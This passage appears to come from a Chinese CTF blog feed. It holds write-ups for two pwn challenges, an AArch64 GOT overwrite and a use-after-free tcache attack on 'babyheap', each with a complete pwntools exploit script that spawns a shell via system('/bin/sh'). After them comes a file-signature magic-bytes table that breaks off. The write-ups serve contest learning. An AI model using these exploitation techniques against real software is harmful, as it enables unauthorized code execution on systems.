title="后门函数代码"></p><p>后门函数会将我们输入的数据写入栈中，刚好最后<code>8字节</code>可以修改<code>X29寄存器</code>的值，而这个寄存器在程序中是用来临时储存函数第一个参数的寄存器，会用来修改<code>X0寄存器</code>，刚好在后门函数结束后会执行一次输入输出，这时可以通过修改<code>got表</code>控制程序流程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">设置X29寄存器为got表中puts项地址-0x18</span><br><span class="hljs-string">这样在每次输入时就会设置puts,read,strncpy函数对应的got表项</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=other_att(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>read_1=<span class="hljs-number">0x4007f4</span><br>ret=<span class="hljs-number">0x400834</span><br>puts_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts=<span class="hljs-number">0x400590</span><br>read=<span class="hljs-number">0x400590</span><br>bss=e.bss(<span class="hljs-number">0x100</span>)<br>p.readuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(puts_got-<span class="hljs-number">0x18</span>))<br>p.readuntil(<span class="hljs-string">&#x27;go&#x27;</span>)<br>p.send(p64(read_1)+p64(read)+p64(ret)) <span class="hljs-comment"># 更改程序流程</span><br>p.send(p64(puts)) <span class="hljs-comment"># 因为正常输出会输出puts函数对应got表项中的数值</span><br>                 <span class="hljs-comment"># 这时利用程序的延迟绑定技术，会使puts函数对应got表项中储存真实的puts函数地址</span><br>                 <span class="hljs-comment"># 可以用来获取libc地址</span><br>d=(u64(p.readuntil(<span class="hljs-string">&quot;\nlet&#x27;s go&quot;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&gt;&gt;<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(system)+p64(read)+p64(<span class="hljs-number">0x4007f0</span>))<br><span class="hljs-comment"># 先通过 LDP  X29, X30, [SP+0x30+var_30],#0x30 指令设置X29的值为栈中的数值</span><br><span class="hljs-comment"># 并将puts函数设置为system</span><br><span class="hljs-comment"># 这时向栈中写入/bin/sh ，在执行puts函数时就会执行system(&quot;/bin/sh&quot;);</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babyheap">babyheap</h2><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap-2.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap-4.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p>因为程序在释放时没有清空指针，存在<code>uaf</code>，且只允许同时存在<code>7</code>个<code>chunk</code>，所以必须要在<code>7</code>个<code>chunk</code>内获取<code>flag</code><br>因为存在<code>uaf</code>，所以可以先获取<code>heap段</code>地址，通过<code>heap段</code>地址就可以知道<code>tcache struct地址</code><br>只要修改<code>tcache bin</code>的值，在任意地址放置<code>chunk</code><br>可以先设置一个<code>chunk</code>的<code>size</code>为<code>0x430</code>，并在这个<code>chunk+0x430</code>的位置处构造两个<code>0x20</code>字节的<code>chunk</code> 释放这个<code>chunk</code>，就会将这个<code>chunk</code>放入<code>unsorted bin</code>中，就可以获取<code>libc</code>地址<br>这时再将<code>free_hook</code>的地址放入<code>tcache bin</code>中，就可以在<code>free_hook</code>中写入<code>system</code>，执行<code>free</code>函数调用<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=process(<span class="hljs-string">&#x27;./babyheap&#x27;</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>heap=d&amp;<span class="hljs-number">0xfffffffffffff000</span>+<span class="hljs-number">0x70</span><br>edit(<span class="hljs-number">1</span>,p64(heap))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(d-<span class="hljs-number">0x10</span>)+p64(d-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x430</span>))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5</span><br>edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>))<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>))<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(free_hook))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment"># 6</span><br>edit(<span class="hljs-number">6</span>,p64(system))<br>pause()<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件格式头</title>
    <link href="/page/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%A4%B4/"/>
    <url>/page/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th style="text-align:left">Mime Type（Content-Type）</th><th style="text-align:left">文件扩展名</th><th style="text-align:left">文件头</th></tr></thead><tbody><tr><td style="text-align:left">video/3gpp</td><td style="text-align:left"><ul><li>3gp</li></ul></td><td style="text-align:left"><ul><li>00 00 00 14 66 74 79 70</li><li>00 00 00 14 66 74 79 70</li><li>00 00 00 20 66 74 79 70</li><li>00 00 00 20 66 74 79 70</li></ul></td></tr><tr><td style="text-align:left">video/mp4</td><td style="text-align:left"><ul><li>mp4</li></ul></td><td style="text-align:left"><ul><li>00 00 00 14 66 74 79 70 69 73 6f 6d</li><li>00 00 00 18 66 74 79 70</li><li>00 00 00 1c 66 74 7</td></tr><tr><td style="text-align:left">9 70</li></ul></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">video/3gpp2</td><td style="text-align:left"><ul><li>3g2</li></ul></td><td style="text-align:left"><ul><li>00 00 00 14 66 74 79 70</li><li>00 00 00 20 66 74 79 70</li></ul></td></tr><tr><td style="text-align:left">video/x-m4v</td><td style="text-align:left"><ul><li>m4v</li></ul></td><td style="text-align:left"><ul><li>00 00 00 18 66 74 79 70</li></ul></td></tr><tr><td style="text-align:left">audio/mp4</td><td style="text-align:left"><ul><li>m4a</li></ul></td><td style="text-align:left"><ul><li>00 00 00 20 66 74 79 70 4d 34 41</li></ul></td></tr><tr><td style="text-align:left">image/x-icon</td><td style="text-align:left"><ul><li>ico</li></ul></td><td style="text-align:left"><ul><li>00 00 01 00</li></ul></td></tr><tr><td style="text-align:left">application/x-futuresplash</td><td style="text-align:left"><ul><li>spl</li></ul></td><td style="text-align:left"><ul><li>00 00 01 00</li></ul></td></tr><tr><td style="text-align:left">video/mpeg</td><td style="text-align:left"><ul><li>mpg</li></ul></td><td style="text-align:left"><ul><li>00 00 01 b3</li><li>00 00 01 ba</li></ul></td></tr><tr><td style="text-align:left">video/x-ms-vob</td><td style="text-align:left"><ul><li>vob</li></ul></td><td style="text-align:left"><ul><li>00 00 01 ba</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-1-2-3</td><td style="text-align:left"><ul><li>123</li></ul></td><td style="text-align:left"><ul><li>00 00 1a 00 05 10 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.quark.quarkxpress</td><td style="text-align:left"><ul><li>qxd</li></ul></td><td style="text-align:left"><ul><li>00 00 49 49 58 50 52</li><li>00 00 4d 4d 58 50 52</li></ul></td></tr><tr><td style="text-align:left">application/x-font-ttf</td><td style="text-align:left"><ul><li>ttf</li></ul></td><td style="text-align:left"><ul><li>00 01 00 00 00</li></ul></td></tr><tr><td style="text-align:left">application/x-msmoney</td><td style="text-align:left"><ul><li>mny</li></ul></td><td style="text-align:left"><ul><li>00 01 00 00 4d 53 49 53 41 4d 20 44 61 74 61 62 61 73 65</li></ul></td></tr><tr><td style="text-align:left">application/x-msaccess</td><td style="text-align:left"><ul><li>mdb</li></ul></td><td style="text-align:left"><ul><li>00 01 00 00 53 74 61 6e 64 61 72 64 20 4a 65 74 20 44 42</li></ul></td></tr><tr><td style="text-align:left">video/x-fli</td><td style="text-align:left"><ul><li>fli</li></ul></td><td style="text-align:left"><ul><li>00 11</li></ul></td></tr><tr><td style="text-align:left">image/x-rgb</td><td style="text-align:left"><ul><li>rgb</li></ul></td><td style="text-align:left"><ul><li>01 da 01 01 00 03</li></ul></td></tr><tr><td style="text-align:left">application/xml-dtd</td><td style="text-align:left"><ul><li>dtd</li></ul></td><td style="text-align:left"><ul><li>07 64 74 32 64 64 74 64</li></ul></td></tr><tr><td style="text-align:left">image/x-pcx</td><td style="text-align:left"><ul><li>pcx</li></ul></td><td style="text-align:left"><ul><li>0a 02 01 01</li><li>0a 03 01 01</li><li>0a 05 01 01</li></ul></td></tr><tr><td style="text-align:left">application/msword</td><td style="text-align:left"><ul><li>doc</li><li>dot</li></ul></td><td style="text-align:left"><ul><li>0d 44 4f 43</li><li>cf 11 e0 a1 b1 1a e1 00</li><li>d0 cf 11 e0 a1 b1 1a e1</li><li>db a5 2d 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-works</td><td style="text-align:left"><ul><li>wks</li><li>wps</li></ul></td><td style="text-align:left"><ul><li>0e 57 4b 53</li><li>ff 00 02 00 04 04 05 54</li><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/vnd.nitf</td><td style="text-align:left"><ul><li>ntf</li></ul></td><td style="text-align:left"><ul><li>1a 00 00</li><li>30 31 4f 52 44 4e 41 4e</li><li>4e 49 54 46 30</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-notes</td><td style="text-align:left"><ul><li>nsf</li></ul></td><td style="text-align:left"><ul><li>1a 00 00 04 00 00</li><li>4e 45 53 4d 1a 01</li></ul></td></tr><tr><td style="text-align:left">application/x-freearc</td><td style="text-align:left"><ul><li>arc</li></ul></td><td style="text-align:left"><ul><li>1a 02</li><li>1a 03</li><li>1a 04</li><li>1a 08</li><li>1a 09</li><li>41 72 43 01</li></ul></td></tr><tr><td style="text-align:left">video/webm</td><td style="text-align:left"><ul><li>webm</li></ul></td><td style="text-align:left"><ul><li>1a 45 df a3</li></ul></td></tr><tr><td style="text-align:left">video/x-matroska</td><td style="text-align:left"><ul><li>mkv</li></ul></td><td style="text-align:left"><ul><li>1a 45 df a3 93 42 82 88</li></ul></td></tr><tr><td style="text-align:left">application/x-msdownload</td><td style="text-align:left"><ul><li>msi</li><li>com</li><li>dll</li><li>exe</li></ul></td><td style="text-align:left"><ul><li>23 20</li><li>d0 cf 11 e0 a1 b1 1a e1</li><li>4d 5a</li><li>e8</li><li>e9</li><li>eb</li></ul></td></tr><tr><td style="text-align:left">audio/silk</td><td style="text-align:left"><ul><li>sil</li></ul></td><td style="text-align:left"><ul><li>23 21 53 49 4c 4b 0a</li></ul></td></tr><tr><td style="text-align:left">application/postscript</td><td style="text-align:left"><ul><li>eps</li></ul></td><td style="text-align:left"><ul><li>25 21 50 53 2d 41 64 6f</li><li>c5 d0 d3 c6</li></ul></td></tr><tr><td style="text-align:left">application/pdf</td><td style="text-align:left"><ul><li>pdf</li></ul></td><td style="text-align:left"><ul><li>25 50 44 46</li></ul></td></tr><tr><td style="text-align:left">application/vnd.fdf</td><td style="text-align:left"><ul><li>fdf</li></ul></td><td style="text-align:left"><ul><li>25 50 44 46</li></ul></td></tr><tr><td style="text-align:left">application/mac-binhex40</td><td style="text-align:left"><ul><li>hqx</li></ul></td><td style="text-align:left"><ul><li>28 54 68 69 73 20 66 69</li></ul></td></tr><tr><td style="text-align:left">text/plain</td><td style="text-align:left"><ul><li>log</li></ul></td><td style="text-align:left"><ul><li>00 2a 2a 2a 20 20 49 6e 73</li></ul></td></tr><tr><td style="text-align:left">application/vnd.rn-realmedia</td><td style="text-align:left"><ul><li>rm</li></ul></td><td style="text-align:left"><ul><li>2e 52 4d 46</li></ul></td></tr><tr><td style="text-align:left">application/vnd.rn-realmedia-vbr</td><td style="text-align:left"><ul><li>rmvb</li></ul></td><td style="text-align:left"><ul><li>2e 52 4d 46</li></ul></td></tr><tr><td style="text-align:left">audio/x-pn-realaudio</td><td style="text-align:left"><ul><li>ra</li><li>ram</li></ul></td><td style="text-align:left"><ul><li>2e 52 4d 46 00 00 00 12</li><li>2e 72 61 fd 00</li><li>72 74 73 70 3a 2f 2f</li></ul></td></tr><tr><td style="text-align:left">audio/basic</td><td style="text-align:left"><ul><li>au</li></ul></td><td style="text-align:left"><ul><li>2e 73 6e 64</li><li>64 6e 73 2e</li></ul></td></tr><tr><td style="text-align:left">application/vnd.epson.msf</td><td style="text-align:left"><ul><li>msf</li></ul></td><td style="text-align:left"><ul><li>2f 2f 20 3c 21 2d 2d 20 3c 6d 64 62 3a 6d 6f 72 6b 3a 7a</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-pki.seccat</td><td style="text-align:left"><ul><li>cat</li></ul></td><td style="text-align:left"><ul><li>30</li></ul></td></tr><tr><td style="text-align:left">video/x-ms-asf</td><td style="text-align:left"><ul><li>asf</li><li>asx</li></ul></td><td style="text-align:left"><ul><li>30 26 b2 75 8e 66 cf 11</li><li>3c</li></ul></td></tr><tr><td style="text-align:left">audio/x-ms-wma</td><td style="text-align:left"><ul><li>wma</li></ul></td><td style="text-align:left"><ul><li>30 26 b2 75 8e 66 cf 11</li></ul></td></tr><tr><td style="text-align:left">video/x-ms-wmv</td><td style="text-align:left"><ul><li>wmv</li></ul></td><td style="text-align:left"><ul><li>30 26 b2 75 8e 66 cf 11</li></ul></td></tr><tr><td style="text-align:left">application/x-mswrite</td><td style="text-align:left"><ul><li>wri</li></ul></td><td style="text-align:left"><ul><li>31 be</li><li>32 be</li><li>be 00 00 00 ab</li></ul></td></tr><tr><td style="text-align:left">application/x-7z-compressed</td><td style="text-align:left"><ul><li>7z</li></ul></td><td style="text-align:left"><ul><li>37 7a bc af 27 1c</li></ul></td></tr><tr><td style="text-align:left">image/vnd.adobe.photoshop</td><td style="text-align:left"><ul><li>psd</li></ul></td><td style="text-align:left"><ul><li>38 42 50 53</li></ul></td></tr><tr><td style="text-align:left">application/xml</td><td style="text-align:left"><ul><li>xml</li></ul></td><td style="text-align:left"><ul><li>3c 3f 78 6d 6c 20 76 65 72 73 69 6f 6e 3d 22 31 2e 30 22 3f 3e</li></ul></td></tr><tr><td style="text-align:left">application/vnd.framemaker</td><td style="text-align:left"><ul><li>fm</li></ul></td><td style="text-align:left"><ul><li>3c 4d 61 6b 65 72 46 69</li></ul></td></tr><tr><td style="text-align:left">application/vnd.mif</td><td style="text-align:left"><ul><li>mif</li></ul></td><td style="text-align:left"><ul><li>3c 4d 61 6b 65 72 46 69</li><li>56 65 72 73 69 6f 6e 20</li></ul></td></tr><tr><td style="text-align:left">application/gpx+xml</td><td style="text-align:left"><ul><li>gpx</li></ul></td><td style="text-align:left"><ul><li>3c 67 70 78 20 76 65 72 73 69 6f 6e 3d 22 31 2e</li></ul></td></tr><tr><td style="text-align:left">application/winhlp</td><td style="text-align:left"><ul><li>hlp</li></ul></td><td style="text-align:left"><ul><li>3f 5f 03 00</li><li>4c 4e 02 00</li></ul></td></tr><tr><td style="text-align:left">image/vnd.dwg</td><td style="text-align:left"><ul><li>dwg</li></ul></td><td style="text-align:left"><ul><li>41 43 31 30</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-organizer</td><td style="text-align:left"><ul><li>org</li></ul></td><td style="text-align:left"><ul><li>41 4f 4c 56 4d 31 30 30</li></ul></td></tr><tr><td style="text-align:left">text/x-vcard</td><td style="text-align:left"><ul><li>vcf</li></ul></td><td style="text-align:left"><ul><li>42 45 47 49 4e 3a 56 43</li></ul></td></tr><tr><td style="text-align:left">application/octet-stream</td><td style="text-align:left"><ul><li>bin</li><li>dms</li><li>mar</li></ul></td><td style="text-align:left"><ul><li>42 4c 49 32 32 33</li><li>44 4d 53 21</li><li>4d 41 52 31 00</li><li>4d 41 52 43</li><li>4d 41 72 30 00</li></ul></td></tr><tr><td style="text-align:left">image/bmp</td><td style="text-align:left"><ul><li>bmp</li></ul></td><td style="text-align:left"><ul><li>42 4d</li></ul></td></tr><tr><td style="text-align:left">application/x-mobipocket-ebook</td><td style="text-align:left"><ul><li>prc</li></ul></td><td style="text-align:left"><ul><li>42 4f 4f 4b 4d 4f 42 49</li></ul></td></tr><tr><td style="text-align:left">application/x-bzip2</td><td style="text-align:left"><ul><li>bz2</li></ul></td><td style="text-align:left"><ul><li>42 5a 68</li></ul></td></tr><tr><td style="text-align:left">application/x-iso9660-image</td><td style="text-align:left"><ul><li>iso</li></ul></td><td style="text-align:left"><ul><li>43 44 30 30 31</li></ul></td></tr><tr><td style="text-align:left">application/mac-compactpro</td><td style="text-align:left"><ul><li>cpt</li></ul></td><td style="text-align:left"><ul><li>43 50 54 37 46 49 4c 45</li><li>43 50 54 46 49 4c 45</li></ul></td></tr><tr><td style="text-align:left">application/x-shockwave-flash</td><td style="text-align:left"><ul><li>swf</li></ul></td><td style="text-align:left"><ul><li>43 57 53</li><li>46 57 53</li><li>5a 57 53</li></ul></td></tr><tr><td style="text-align:left">application/x-cdlink</td><td style="text-align:left"><ul><li>vcd</li></ul></td><td style="text-align:left"><ul><li>45 4e 54 52 59 56 43 44</li></ul></td></tr><tr><td style="text-align:left">image/vnd.ms-modi</td><td style="text-align:left"><ul><li>mdi</li></ul></td><td style="text-align:left"><ul><li>45 50</li></ul></td></tr><tr><td style="text-align:left">video/x-flv</td><td style="text-align:left"><ul><li>flv</li></ul></td><td style="text-align:left"><ul><li>46 4c 56</li></ul></td></tr><tr><td style="text-align:left">audio/x-aiff</td><td style="text-align:left"><ul><li>aiff</li></ul></td><td style="text-align:left"><ul><li>46 4f 52 4d 00</li></ul></td></tr><tr><td style="text-align:left">message/rfc822</td><td style="text-align:left"><ul><li>eml</li></ul></td><td style="text-align:left"><ul><li>46 72 6f 6d</li><li>52 65 74 75 72 6e 2d 50</li><li>58 2d</li></ul></td></tr><tr><td style="text-align:left">image/gif</td><td style="text-align:left"><ul><li>gif</li></ul></td><td style="text-align:left"><ul><li>47 49 46 38</li></ul></td></tr><tr><td style="text-align:left">image/tiff</td><td style="text-align:left"><ul><li>tif</li><li>tiff</li></ul></td><td style="text-align:left"><ul><li>49 20 49</li><li>49 49 2a 00</li><li>4d 4d 00 2a</li><li>4d 4d 00 2b</li></ul></td></tr><tr><td style="text-align:left">audio/mpeg</td><td style="text-align:left"><ul><li>mp3</li></ul></td><td style="text-align:left"><ul><li>49 44 33</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-cab-compressed</td><td style="text-align:left"><ul><li>cab</li></ul></td><td style="text-align:left"><ul><li>49 53 63 28</li><li>4d 53 43 46</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-htmlhelp</td><td style="text-align:left"><ul><li>chm</li></ul></td><td style="text-align:left"><ul><li>49 54 53 46</li></ul></td></tr><tr><td style="text-align:left">application/java-archive</td><td style="text-align:left"><ul><li>jar</li></ul></td><td style="text-align:left"><ul><li>4a 41 52 43 53 00</li><li>50 4b 03 04</li><li>50 4b 03 04 14 00 08 00</li><li>5f 27 a8 89</li></ul></td></tr><tr><td style="text-align:left">application/x-ms-shortcut</td><td style="text-align:left"><ul><li>lnk</li></ul></td><td style="text-align:left"><ul><li>4c 00 00 00 01 14 02 00</li></ul></td></tr><tr><td style="text-align:left">application/x-tgif</td><td style="text-align:left"><ul><li>obj</li></ul></td><td style="text-align:left"><ul><li>4c 01</li><li>80</li></ul></td></tr><tr><td style="text-align:left">application/vnd.palm</td><td style="text-align:left"><ul><li>pdb</li></ul></td><td style="text-align:left"><ul><li>4d 2d 57 20 50 6f 63 6b</li><li>4d 69 63 72 6f 73 6f 66 74 20 43 2f 43 2b 2b 20</li><li>73 6d 5f</li><li>73 7a 65 7a</li><li>ac ed 00 05 73 72 00 12</li></ul></td></tr><tr><td style="text-align:left">application/vnd.tcpdump.pcap</td><td style="text-align:left"><ul><li>dmp</li><li>cap</li></ul></td><td style="text-align:left"><ul><li>4d 44 